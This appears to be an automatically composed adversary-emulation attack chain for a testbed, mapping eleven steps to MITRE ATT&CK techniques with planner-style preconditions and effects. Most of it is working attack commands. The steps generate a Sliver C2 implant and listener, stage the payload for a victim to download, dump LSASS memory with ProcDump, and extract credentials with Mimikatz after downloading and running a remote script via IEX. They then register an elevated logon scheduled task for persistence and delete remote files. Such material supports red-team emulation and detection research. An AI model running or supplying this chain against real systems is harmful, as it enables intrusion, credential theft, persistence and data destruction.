# Chain 037

**Testbed**: `env0` · **Steps**: 11 · **Tactics touched**: Command and Control, Execution, Discovery, Credential Access, Persistence, Defense Evasion, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1204.002, T1059.001 |
| Discovery | T1083 |
| Credential Access | T1003.001 |
| Persistence | T1053.005 |
| Defense Evasion | T1070.004, T1485 |
| Impact | T1070.004, T1485 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file | Human |
| 3 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 4 | Discovery | T1083 | Remote Directory Listing | Sliver Executor |
| 5 | Execution | T1204.002 | Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin | Human |
| 6 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 7 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 8 | Credential Access | T1003.001 | Dump LSASS.exe Memory using ProcDump | Powershell Executor |
| 9 | Credential Access | T1003.001 | Offline Credential Theft With Mimikatz | Powershell Executor |
| 10 | Persistence | T1053.005 | Powershell Cmdlet Scheduled Task | Powershell Executor |
| 11 | Defense Evasion, Impact | T1070.004, T1485 | Remove Remote Path | Sliver Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download and execute malicious payload file

- **UUID**: `simulate-download-execute-file`
- **Source**: Manual
- **Supported platforms**: windows, linux
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:8000 in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed ?file - file ?target - host)`

---

### Step 3 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 4 — Remote Directory Listing

- **UUID**: `sliver-ls`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Discovery
- **MITRE ID(s)**: T1083
- **Technique(s)**: File and Directory Discovery

**Description**

The `ls <remote path>` command lists files and directories in a specified remote path or the current directory if no path is provided. By default, it sorts listings by name in ascending order, but can also sort by size or modified time, with options to reverse the order. The command includes flags for sorting, reversing order, and setting a timeout.

**Execution** (Sliver Executor)

```
ls(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(file-and-directory-info-known ?target - host)`

---

### Step 5 — Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin

- **UUID**: `simulate-execute-lnk-windows-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Description**

This step simulates the victim opening a `.lnk` shortcut whose target is a pre-staged executable **and the shortcut is configured / launched such that the target runs as Administrator** — either the shortcut's Properties → Advanced → "Run as administrator" flag is set, or the victim right-clicks the shortcut and selects "Run as administrator".

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, on the desktop or a folder)
Right-click a shortcut (.lnk) whose target is:
#{EXE_PATH}
then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click).
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `EXE_PATH` | Path of the executable the shortcut points at | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- `(os-windows ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 6 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 7 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 8 — Dump LSASS.exe Memory using ProcDump

- **UUID**: `art-t1003_001-procdump-full-dump`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Sysinternals ProcDump with `-ma` (full memory dump) writes lsass.exe
memory to a target-side .dmp file. Uses Method 3 (fold get_prereq_command
from ART): if procdump.exe isn't already staged, download the Sysinternals
Procdump.zip, unzip, and copy the binary before invoking. ART
auto_generated_guid 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8.

**Execution** (Powershell Executor)

```
$procdump = "#{procdump_exe}"
if (-not (Test-Path $procdump)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  $zipPath = "$env:TEMP\Procdump.zip"
  $extractDir = "$env:TEMP\Procdump"
  Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile $zipPath
  Expand-Archive $zipPath $extractDir -Force
  New-Item -ItemType Directory (Split-Path $procdump) -Force | Out-Null
  Copy-Item "$extractDir\Procdump.exe" $procdump -Force
}
& $procdump -accepteula -ma lsass.exe "#{output_file}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke ProcDump. | — | yes |
| `procdump_exe` | Target-side path where ProcDump is staged and invoked. | C:\\Users\\Public\\procdump.exe | yes |
| `output_file` | Target-side path for the resulting LSASS full memory dump. | C:\\Windows\\Temp\\lsass_dump.dmp | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(file-exists ?path - string ?f - file ?target - host)`
- `(lsass-dump-file ?f - file)`
- `(callback-covered ?f - file)`

---

### Step 9 — Offline Credential Theft With Mimikatz

- **UUID**: `art-t1003_001-mimikatz-offline-dump`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Mimikatz `sekurlsa::minidump <dumpfile>; sekurlsa::logonpasswords full`
processes an already-existing LSASS memory dump on target and prints
credential material to stdout. Chain-composition consumer: pair with
any dumper that emits `(lsass-dump-file …)` — ProcDump, NanoDump,
comsvcs.dll, rdrleakdiag, Out-Minidump, Silent Process Exit. Method 3
folds mimikatz staging (fetch latest release from GitHub API + unzip
via ART's Invoke-FetchFromZip helper). ART auto_generated_guid
453acf13-1dbd-47d7-b28a-172ce9228023.

**Execution** (Powershell Executor)

```
$mimikatz = "#{mimikatz_exe}"
if (-not (Test-Path $mimikatz)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1' -UseBasicParsing).Content
  $releases = (Invoke-WebRequest 'https://api.github.com/repos/gentilkiwi/mimikatz/releases' -UseBasicParsing | ConvertFrom-Json)
  $zipUrl = $releases[0].assets.browser_download_url | Where-Object { $_.EndsWith('.zip') } | Select-Object -First 1
  $basePath = Split-Path (Split-Path $mimikatz)
  New-Item -ItemType Directory $basePath -Force | Out-Null
  Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
}
& $mimikatz "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" "exit"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke mimikatz. | — | yes |
| `mimikatz_exe` | Target-side path where mimikatz is staged and invoked. | C:\\Users\\Public\\x64\\mimikatz.exe | yes |
| `input_file` | Path to an existing LSASS memory dump file on the target (produced by an earlier dumper action). | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`
- `(file-exists ?path - string ?f - file ?target - host)`
- `(lsass-dump-file ?f - file)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 10 — Powershell Cmdlet Scheduled Task

- **UUID**: `art-t1053_005-powershell-scheduled-task`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1053.005
- **Technique(s)**: Scheduled Task/Job: Scheduled Task

**Description**

Registers a scheduled task via the native `Register-ScheduledTask`
cmdlet. Uses `New-ScheduledTaskAction` / `-AtLogon` trigger /
`RunLevel Highest` principal so the task runs elevated as an
Administrator group member at each logon. Original ART hardcodes
`calc.exe`; parameterised. ART auto_generated_guid
af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd.

**Execution** (Powershell Executor)

```
$Action = New-ScheduledTaskAction -Execute "#{task_command}"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$Task = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask "#{task_name}" -InputObject $Task
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to register the task. | — | yes |
| `task_name` | Name of the scheduled task. | AtomicTask | yes |
| `task_command` | Executable the scheduled task launches at logon. | C:\\Users\\Public\\payload.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 11 — Remove Remote Path

- **UUID**: `sliver-rm`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Defense Evasion, Impact
- **MITRE ID(s)**: T1070.004, T1485
- **Technique(s)**: Indicator Removal: File Deletion
, Data Destruction

**Description**

The `rm(remote_path, recursive=False, force=False)` command removes a directory or file(s) from the remote system. Parameters include remote_path (remote path), recursive (recursively remove file(s)), and force (forcefully remove the file(s)).

**Execution** (Sliver Executor)

```
rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `RemotePath` | Remote path | — | yes |
| `Recursive` | Recursively remove file(s) | — | yes |
| `Force` | Forcefully remove the file(s) | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?f - file ?target - host)`

**Effects**

- `(file-deleted ?f - file ?target - host)`

---
